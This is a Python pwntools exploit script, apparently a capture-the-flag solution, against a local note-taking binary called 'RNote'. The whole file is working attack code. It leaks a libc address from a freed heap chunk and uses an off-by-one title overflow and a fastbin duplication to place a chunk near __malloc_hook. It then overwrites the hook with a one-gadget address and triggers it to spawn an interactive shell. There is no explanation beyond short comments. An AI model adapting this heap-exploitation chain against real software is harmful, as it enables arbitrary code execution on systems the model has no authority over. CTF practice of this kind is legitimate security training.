from pwn import *

r = process("./RNote")
e = ELF("./RNote")
context.log_level = "debug"
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
arena_off = 0x3c4b20
oneshot_off = 0xf1147
malloc_hook_off = l.symbols['__malloc_hook']


def add(size, title, content) :
    r.sendlineafter("choice: ", "1")
    r.sendlineafter("size: ", str(size))
    r.sendlineafter("title: ", title)
    r.sendlineafter("content: ", content)

def delete(delete) :
    r.sendlineafter("choice: ", "2")
    r.sendlineafter("delete: ", str(delete))

def show(show) :
    r.sendlineafter("choice: ", "3")
    r.sendlineafter("show: ", str(show))

add(200, "AAAA", "AAAA")
add(200, "AAAA", "AAAA")
delete(0)
add(200, "AAAA", "AAAA")
show(0)

r.recvuntil("\x7f")
leak_add = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00")
libc_base = leak_add - (arena_off + 88)
oneshot_add = libc_base + oneshot_off
malloc_hook_add = libc_base + malloc_hook_off

log.info("leak_add = " + hex(leak_add))
log.info("libc_base = " + hex(libc_base))
log.info("oneshot_add = " + hex(oneshot_add))
log.info("malloc_hook_add = " + hex(malloc_hook_add))

delete(0)
delete(1)
delete(2)

add(96, "AAAA", "AAAA")
add(96, "BBBB", "BBBB")
add(96, "C"*16+"\x10", "CCCC")

delete(0)
delete(1)
delete(2)

add(96,"AAAA",p64(malloc_hook_add-0x23)) #fastbin dup
add(96,"BBBB","BBBB")
add(96,"CCCC","CCCC")
add(96,"DDDD","D"*19 + p64(oneshot_add)) #malloc in malloc_hook-0x23

r.sendlineafter("Your choice: ","1")
r.sendlineafter("note size: ","1")
 
r.interactive()
